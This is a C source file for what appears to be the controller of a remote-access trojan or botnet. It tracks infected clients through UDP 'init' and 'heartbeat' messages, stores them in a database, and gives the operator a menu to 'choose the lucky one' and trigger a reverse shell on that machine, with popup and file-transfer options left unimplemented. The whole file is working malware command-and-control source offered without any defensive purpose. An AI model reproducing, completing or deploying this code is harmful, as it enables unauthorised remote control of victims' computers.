#include "netlib.h"
#include "db.h"
#include <pthread.h>
#include "bs_config.h"
#include "utils.h"
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>

enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};

volatile int terminate_thread = 0;

struct udp_arg{
    int sockfd;
    struct db* db;
};

// void udp_handler(isockfd){

// }

void* udp_handler(void* args){
    struct udp_arg* ua = (struct udp_arg*) args;
    struct db* db = ua->db;
    int sockfd_u = ua->sockfd;
    char siginit = 0;
    int bytes = 0;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = 16;
    unsigned char buffer[8];
    memset(&client_addr, 0, sizeof(client_addr));
    while (!terminate_thread){
        if ((bytes = recvfrom(sockfd_u, buffer, 8, 0, (struct sockaddr*)&client_addr, &client_addr_len)) > 0){
            printf("we got %d bytes first byte we got is %d\n",bytes,  buffer[0]);
            printf("inet addr we got connection from is %s\n", get_ip(client_addr));
            if (buffer[0] == _SIG_INIT){
                send_udp(sockfd_u, &client_addr, &siginit, 1);
                add_db(db, (char*)&client_addr, time(NULL));
            }
            if (buffer[0] == _SIG_HRBT){
                DBGLG("Got a heartbeat\n");
                if (upd_timestamp_db(db, get_ip(client_addr))< 0){
                    DBGLG("Failed to update a heartbeat\n");
                }
            }
                
            }
    }
}

void solo_interaction(struct db* db, int sockfd_u)
{
    int user;
    int choice;
    struct sockaddr_in sa;
    int i = 0;
    char shll = _SIG_SHLL;
    char cout = _SIG_COUT;
    char buf[2048];
    
    int client_fd;
    int select_result;
    char ch;
    memset(buf, 0, 2048);
     // Buffer to hold the IP address string
    printf("Choose a user\n");
    print_db(db);
    isc(&user);
    printf("Choose the deed:\n0 - Cout: popup window on client machine UNIMPLEMENTED\n1 - \
Shell: pop a reverse shell\n2 - File: send or recieve a file UNIMPLEMENTED\n3 - exit this menu\n");
    isc(&choice);
    sa = *((struct sockaddr_in*)db->st[user]->sa);
    switch(choice){
        case 0:
            printf("Input what to show in a pop up:\n");
                while (((ch = getchar()) != '\n' || i == 0) && i < sizeof(buf) - 1 ) {
                buf[i++] = ch;
            }
            
            // Null-terminate the buffer
            buf[i] = '\0';
            printf("We got %d len and the string is %s\n", i, buf);
            send_udp(sockfd_u, &sa, &cout, 1);
            send_udp(sockfd_u, &sa, buf, strlen(buf));
            break;
        case 1:
            // Convert the binary IP address to a human-readable string
            handle_shell(sa, sockfd_u, _SIG_SHLL);
            break;
        default:
            DBGLG("Unimplemented, exiting\n");
            return;
        
    }
    return;
}

int main(int argc, char **argv)
{
	printf("Starting\n");
    pthread_t tid;
    struct db* db = NULL;
    int sockfd_u;
    struct sockaddr_in local_addr;
    DBGLG("Attempting to load a db\n");
    if (load_db(&db, "db.db") < 0){
        create_db(&db);
        if (db == NULL){
            exit(EXIT_FAILURE);
        }
    }
    create_udp_socket(&sockfd_u);
    
    update_sockaddr_in(&local_addr, AF_INET, UDP_PORT, NULL);
    bind_socket(sockfd_u, &local_addr);
    struct timeval timeout;
    timeout.tv_sec = 4;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt");
        DBGLG("Could not set appropriate timeout\n");
        exit(EXIT_FAILURE); 
    }
    struct udp_arg ua = {sockfd_u, db};
    if(pthread_create(&tid, NULL, &udp_handler, &ua) != 0)
    {
        perror("Thread creation failed.");
        exit(EXIT_FAILURE);
    }
    pthread_detach(tid);
    
    DBGLG("Listening for UDP packets...\n");
    int choice = 0;
    while (1) {
        printf("choose your option:\n0 - view data base\n1 - choose the lucky one\n2 - exit\n\n");
        isc(&choice);
        switch (choice){
            case 0:
                print_db(db);
                break;
            case 1:
                solo_interaction(db, sockfd_u);
                break;
            case 2:
                DBGLG("Killing listeners\n");
                terminate_thread = 1;
                pthread_join(tid, NULL);
                DBGLG("Saving db\n");
                save_db(db, "./db.db");
                DBGLG("Closing sockets\n");
                free_db(&db);
                close(sockfd_u);
                goto _exit;
            default:
                printf("Unfamiliar with this option\n");
                break;

        }
        // TODO: Write a menu
        // basically a control panel
        // It can choose to which client to interact
        // Or Interact with all




    }
    _exit:
	printf("Exiting?\n");
    return EXIT_SUCCESS;
}
